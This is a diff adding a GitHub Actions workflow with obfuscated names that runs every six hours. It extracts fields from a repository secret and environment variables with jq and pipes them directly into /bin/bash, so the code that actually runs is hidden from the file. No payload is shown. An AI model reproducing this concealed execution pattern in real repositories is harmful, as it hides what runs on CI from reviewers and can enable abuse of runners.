@@ -1,0 +1,23 @@
+name: xiangguwuyantianlll
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangguwuyantianlll
+        env:
+          j14: ${{ secrets.j14 }}
+        run: |
+          echo $j14 | jq -r .eai7744 | /bin/bash
+          echo $xzwcw5276 | jq -r .zuxws791 | /bin/bash
+          echo $jwbgr3 | jq -r .j03278 | /bin/bash
+          echo $odmuz105 | jq -r .ld5615 | /bin/bash
+          echo $xemff1935 | jq -r .mhi31988 | /bin/bash
+          echo $cpj41199 | jq -r .zj9 | /bin/bash
+          echo $a0 | jq -r .qkqi2 | /bin/bash
+
